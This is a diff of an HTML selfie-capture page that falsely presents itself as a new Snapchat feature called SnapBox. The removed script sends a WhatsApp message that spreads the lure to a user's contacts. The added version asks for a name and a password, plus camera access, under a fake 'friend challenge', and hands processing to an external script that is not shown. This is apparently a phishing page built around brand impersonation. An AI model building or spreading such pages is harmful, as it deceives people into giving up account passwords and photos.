@@ -1,187 +1,107 @@
-<!-- SnapBox Live with Floating Social Share Buttons -->
 <!DOCTYPE html>
-<html lang="en" class="bg-black text-white">
+<html lang="en" class="dark bg-black text-white">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SnapBox Live</title>
-  <link rel="icon" href="assets/logo.png" />
+  <!--Favicon-->
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/20250721_123142.png">
+  <!-- Tailwind CSS -->
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+
+  <!-- Lucide Icons -->
   <script src="https://unpkg.com/lucide@latest"></script>
+
+  <!-- Font -->
   <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-
-  <style>
-    body { font-family: 'Lexend', sans-serif; }
-
-    .btn-glow {
-      background-color: #f0f002; color: black;
-      transition: all 0.3s ease;
-      padding: 0.5rem 1.5rem;
-      border-radius: 9999px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.2);
-    }
-
-    .btn-glow:hover {
-      background-color: white; color: black;
-      box-shadow: 0 0 10px #f0f002, 0 0 20px #f0f002;
-    }
-
-    .btn-reset {
-      background-color: #ef4444;
-      color: white;
-      padding: 0.5rem 1.5rem;
-      border-radius: 9999px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      transition: all 0.3s ease;
-    }
-
-.popup-box {
-  background: white;
-  color: black;
-  width: 300px;
-  height: 200px;
-  border-radius: 1rem;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-  text-align: center;
-  font-weight: bold;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  gap: 1rem;
-  box-sizing: border-box;
-  padding: 1rem;
-}
-
-    .msg-box {
-      background: #22c55e;
-      color: white;
-      font-size: 1.25rem;
-      font-weight: bold;
-      padding: 1rem 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-    }
-
-    .preview-ring { animation: spin 3s linear infinite; }
-    .stopped { animation: none !important; }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .preview-box {
-      border: 4px solid #f0f002; background: #f0f002;
-      width: 100px; height: 160px;
-      border-radius: 0.5rem; display: flex;
-      align-items: center; justify-content: center;
-      background-size: cover; background-position: center;
-      position: relative; font-weight: bold; color: #000;
-    }
-
-    .camera-icon {
-      position: absolute; bottom: 5px; right: 5px;
-      background: #fff; border-radius: 50%; padding: 4px;
-    }
-
-    #camera { transform: scaleX(-1); border-radius: 1rem; }
-
-    /* Floating Social Share Buttons */
-    .social-buttons {
-      position: fixed;
-      right: 20px;
-      top: 40%;
-      transform: translateY(-50%);
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      z-index: 1000;
-    }
-
-    .social-buttons button {
-      width: 50px;
-      height: 50px;
-      border: none;
-      border-radius: 50%;
-      color: white;
-      font-size: 20px;
-      cursor: pointer;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .social-buttons button:hover {
-      transform: scale(1.1);
-      box-shadow: 0 6px 12px rgba(0,0,0,0.4);
-    }
-
-    .whatsapp { background-color: #16d900; }
-    .facebook { background-color: #0074e0; }
-    .snapchat { background-color: #f0f002; }
-    .snapchat i { color: black !important; }
-    .instagram {
-      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af);
-    }
-  </style>
-</head>
+<!-- Font Awesome CDN -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <link rel="stylesheet" href="css/style.css" />
+  </head>
 
 <body class="flex flex-col items-center justify-center min-h-screen px-4">
 
-  <!-- Welcome Popup -->
 <!-- Welcome Popup -->
-<div id="welcomePopup" class="fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40">
-  <div class="popup-box flex flex-col items-center justify-center gap-4">
-    <img src="assets/logo.png" class="w-16"  />
-    <div>Welcome! to Snapchat new feature Snapbox 👻</div>
+<div id="welcomePopup" class="hidden fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40 transition duration-500">
+  <div class="bg-white text-black text-center text-base font-light px-6 py-6 w-72 h-40 rounded-xl shadow-xl flex items-center justify-center">
+    Welcome! to Snapchat new feature SnapBox 👻
   </div>
 </div>
 
-  <!-- Name Input -->
-  <div id="namePopup" class="fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40 hidden">
-    <div class="bg-white text-black text-center text-base font-light px-6 py-6 w-72 h-48 rounded-xl shadow-xl flex flex-col items-center justify-center gap-4">
-      <span>Enter your name</span>
-      <input id="nameInput" type="text" placeholder="Your name" class="px-3 py-2 border rounded w-full text-black" />
-      <button onclick="submitName()" class="bg-[#f0f002] px-4 py-1 rounded font-bold text-black">Start</button>
+    <!-- Your Friend Challenge-->
+  <div id="challengePopup" class="hidden fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40 transition duration-500">
+    <div class="bg-white text-black text-center text-base font-light px-6 py-6 w-72 h-40 rounded-xl shadow-xl flex items-center justify-center">
+      Your Feiend Challenged you to click 4-Selfies in 10 second.
     </div>
   </div>
 
-  <!-- Main App -->
-  <div id="mainContainer" class="filter blur-md pointer-events-none transition duration-500 w-full flex flex-col items-center justify-center">
-    <div class="absolute top-4 left-4 z-50 flex flex-col items-center gap-1">
-      <div class="w-12 h-12 p-1 rounded-full bg-gradient-to-tr from-purple-700 to-pink-500">
-        <div class="bg-white w-full h-full rounded-full flex items-center justify-center">
-          <i data-lucide="user" class="w-5 h-5 text-black"></i>
-        </div>
-      </div>
-      <span id="userName" class="text-sm font-semibold text-[#f0f002]"></span>
-    </div>
+  <!-- Name Modal (hidden initially) -->
+  <div id="nameModal" class="hidden fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40">
+    <div class="bg-white text-black px-6 py-8 w-80 rounded-xl shadow-xl text-center">
+      <h2 class="font-bold text-lg mb-4">Enter your name</h2>
+      <input id="nameInput" type="text" placeholder="Your name" class="w-full mb-3 px-4 py-2 border rounded-md text-black focus:outline-none" />
+      <input id="passwordInput" type="password" placeholder="Password" class="w-full mb-4 px-4 py-2 border rounded-md text-black focus:outline-none" />
+<button type="button" onclick="storeName()" class="btn-glow w-full py-2 rounded-md font-bold">Start</button>    </div>
+  </div>
 
+
+
+  <!-- Main App Content -->
+  <div id="mainContainer" class="filter blur-md pointer-events-none transition duration-500 w-full flex flex-col items-center justify-center">
+  <!-- Floating Social Share Buttons -->
+  <div class="fixed top-1/2 right-4 transform -translate-y-1/2 space-y-4 z-50">
+<button onclick="shareOnWhatsApp()" 
+   style="background-color: #26d902;" 
+   class="block w-10 h-10 rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition">
+  <i class="fab fa-whatsapp text-white text-2xl"></i>
+</button> 
+    <a href="https://www.instagram.com/"
+      style= " background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af);"      target="_blank" class="block w-10 h-10 rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition"><i class= "fab fa-instagram text-2xl"></i></a>
+ <button onclick="copySnapchatMessage()"
+   style="background-color: #FFFC00;" 
+   class="block w-10 h-10 rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition">
+  <i class="fab fa-snapchat-ghost text-black text-2xl"></i>
+</button>
+    <a href="https://facebook.com/" target="_blank" class="block w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center shadow-lg hover:scale-110 transition"><i class="fab fa-facebook-f text-2xl "></i></a>
+  </div>
+<!-- User Icon + Name (Top Left) -->
+<div class="absolute top-4 left-4 z-50 flex flex-col items-center space-y-1">
+  <!-- Icon -->
+  <div class="w-12 h-12 p-1 rounded-full bg-gradient-to-tr from-purple-700 to-pink-500">
+    <div style="background-color:#ffff" class="w-full h-full rounded-full flex items-center justify-center">
+      <i data-lucide="user" class="w-5 h-5 text-black"></i>
+    </div>
+  </div>
+
+  <!-- Name directly below -->
+<div id="userNameDisplay"
+     class="hidden font-semibold text-sm transition-all duration-300">
+</div>
+  
+</div>
+
+    <!-- Toggle Theme (Top Right) -->
     <button onclick="toggleTheme()" class="absolute top-4 right-4 p-3 rounded-full bg-gray-800 text-white flex items-center justify-center">
       <i data-lucide="sun"></i>
     </button>
 
+    <!-- Header -->
     <div class="flex flex-col items-center mb-2 mt-4">
-      <img src="assets/logo.png" class="w-24 animate-bounce" />
+      <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/20250721_123142.png" class="w-24 animate-bounce" />
       <h1 class="text-xl text-[#f0f002] font-bold tracking-wide mt-2">SnapBox</h1>
     </div>
 
+    <!-- Camera Preview -->
     <div class="mb-5 border-4 rounded-2xl overflow-hidden" style="border-color:#f0f002">
-      <video id="camera" autoplay playsinline class="w-64 h-96 object-cover shadow-xl"></video>
+      <video id="camera" autoplay muted playsinline class="w-64 h-96 object-cover shadow-xl"></video>
     </div>
 
-    <button onclick="manualCapture()" class="btn-glow">
+    <!-- Capture Button -->
+    <button onclick="capturePhoto()" class="btn-glow font-bold px-6 py-2 rounded-full transition mb-4 flex items-center gap-2 shadow">
       <i data-lucide="camera" class="w-5 h-5"></i> Capture
     </button>
 
+    <!-- Preview Boxes -->
     <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
       <div class="preview-ring"><div class="preview-box">Tap 1<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
       <div class="preview-ring"><div class="preview-box">Tap 2<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
@@ -189,156 +109,30 @@
       <div class="preview-ring"><div class="preview-box">Tap 4<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
     </div>
 
+    <!-- Action Buttons -->
     <div class="flex gap-4 mb-6">
-      <button onclick="downloadAllPhotos()" class="btn-glow">
+      <button onclick="downloadAllPhotos()" class="btn-glow px-6 py-2 rounded-full font-bold transition flex items-center gap-2 shadow">
         <i data-lucide="download" class="w-5 h-5"></i> Download
       </button>
-      <button onclick="resetAll()" class="btn-reset">
+      <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-full font-bold transition flex items-center gap-2 shadow">
         <i data-lucide="rotate-ccw" class="w-5 h-5"></i> Reset
       </button>
     </div>
 
-    <!-- WhatsApp Share -->
-    <a id="whatsappShare" target="_blank"
-       class="fixed bottom-20 right-20 z-50 bg-green-500 hover:bg-green-600 text-white p-4 rounded-full shadow-xl flex items-center justify-center">
-      <i data-lucide="send" class="w-5 h-5"></i>
-    </a>
-
+    <!-- Upload Success Message -->
     <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
-      <div class="msg-box">🎉 Congratulations! You won the task!</div>
+      <div class="bg-green-500 text-white text-xl font-bold px-10 py-5 w-50 h-50 rounded-xl shadow-xl">
+        🎉 Congratulations! You won the task!
+      </div>
     </div>
 
-    <div class="fab-chat"><i data-lucide="message-circle" class="w-5 h-5"></i></div>
+    <!-- Floating Chat Icon -->
+    <div class="fab-chat">
+      <i data-lucide="message-circle" class="w-5 h-5"></i>
+    </div>
+
     <canvas id="canvas" class="hidden"></canvas>
   </div>
-
-  <!-- Social Share Buttons -->
-  <div class="social-buttons">
-    <button class="whatsapp" onclick="window.open('https://wa.me/?text=Check%20this%20out!', '_blank')">
-      <i class="fab fa-whatsapp"></i>
-    </button>
-    <button class="instagram" onclick="window.open('https://instagram.com', '_blank')">
-      <i class="fab fa-instagram"></i>
-    </button>
-    <button class="snapchat" onclick="window.open('https://snapchat.com', '_blank')">
-      <i class="fab fa-snapchat-ghost"></i>
-    </button>
-    <button class="facebook" onclick="window.open('https://facebook.com', '_blank')">
-      <i class="fab fa-facebook-f"></i>
-    </button>
-  </div>
-
-  <script>
-    lucide.createIcons();
-    let userName = "", currentIndex = 0;
-    const capturedImages = [];
-
-    function toPascalCase(str) {
-      return str.replace(/\w\S*/g, (w) => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase());
-    }
-
-    function submitName() {
-      const input = document.getElementById("nameInput").value.trim();
-      if (!input) return alert("Please enter your name");
-
-      userName = toPascalCase(input);
-      document.getElementById("userName").innerText = userName;
-
-      const link = "https://snapbox-selfie.github.io/snapchat/";
-      const msg = `${userName} sent you Snapchat new features Snapbox-Selfie 👻\nClick here 👉 ${link}`;
-      const whatsappLink = `https://wa.me/?text=${encodeURIComponent(msg)}`;
-      document.getElementById("whatsappShare").href = whatsappLink;
-
-      document.getElementById("namePopup").classList.add("hidden");
-      const main = document.getElementById("mainContainer");
-      main.classList.remove("blur-md", "pointer-events-none");
-
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then((stream) => {
-          document.getElementById("camera").srcObject = stream;
-        }).catch((err) => {
-          alert("Camera access failed");
-          console.error(err);
-        });
-    }
-
-    function toggleTheme() {
-      const html = document.documentElement;
-      html.classList.toggle("bg-black");
-      html.classList.toggle("text-white");
-      html.classList.toggle("bg-white");
-      html.classList.toggle("text-black");
-    }
-
-    function capturePhoto(auto = false) {
-      const video = document.getElementById('camera');
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const dataUrl = canvas.toDataURL('image/jpeg');
-      const blob = dataURLtoBlob(dataUrl);
-
-      if (!auto && currentIndex < 4) {
-        const box = document.querySelectorAll('.preview-box')[currentIndex];
-        box.style.backgroundImage = `url(${dataUrl})`;
-        box.innerText = '';
-        capturedImages.push(blob);
-        currentIndex++;
-
-        if (currentIndex === 4) {
-          const msg = document.getElementById('msg');
-          msg.classList.remove('hidden');
-          setTimeout(() => msg.classList.add('hidden'), 3000);
-          document.querySelectorAll('.preview-ring').forEach(el => el.classList.add('stopped'));
-        }
-      }
-    }
-
-    function manualCapture() {
-      capturePhoto(false);
-    }
-
-    function downloadAllPhotos() {
-      if (capturedImages.length < 1) return alert("Capture photos first!");
-      capturedImages.forEach((blob, i) => {
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `selfie_${i + 1}.jpg`;
-        document.body.appendChild(a); a.click(); document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-      });
-    }
-
-    function resetAll() {
-      currentIndex = 0;
-      capturedImages.length = 0;
-      document.querySelectorAll('.preview-box').forEach((box, i) => {
-        box.style.backgroundImage = '';
-        box.innerText = `Tap ${i + 1}`;
-      });
-      document.getElementById('msg').classList.add('hidden');
-      document.querySelectorAll('.preview-ring').forEach(el => el.classList.remove('stopped'));
-    }
-
-    function dataURLtoBlob(dataurl) {
-      const parts = dataurl.split(','), mime = parts[0].match(/:(.*?);/)[1];
-      const bstr = atob(parts[1]); let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while (n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], { type: mime });
-    }
-
-    window.addEventListener("load", () => {
-      setTimeout(() => {
-        document.getElementById("welcomePopup").remove();
-        document.getElementById("namePopup").classList.remove("hidden");
-      }, 3000);
-    });
-  </script>
+<script src="js/script.js"> </script>
 </body>
 </html>
